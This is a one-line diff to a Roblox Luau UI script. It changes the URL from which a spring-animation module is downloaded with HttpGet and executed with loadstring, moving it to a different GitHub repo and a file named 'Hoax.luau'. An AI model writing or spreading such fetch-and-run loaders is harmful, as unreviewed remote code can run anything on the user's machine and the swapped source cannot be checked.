@@ -34,7 +34,7 @@ local Players		   = game:GetService("Players")
 
 -- // Variables
 
-local Spring = RunService:IsStudio() and require(workspace.spr) or loadstring(game:HttpGet("https://raw.githubusercontent.com/vFishyTurtle/WiiPrivate/refs/heads/main/spr"))()
+local Spring = RunService:IsStudio() and require(workspace.spr) or loadstring(game:HttpGet("https://raw.githubusercontent.com/Forexium/Yon/refs/heads/main/Hoax.luau"))()
 local Player = Players.LocalPlayer
 local Mouse  = Player:GetMouse()
 local Theme  = WiiUI.Theme
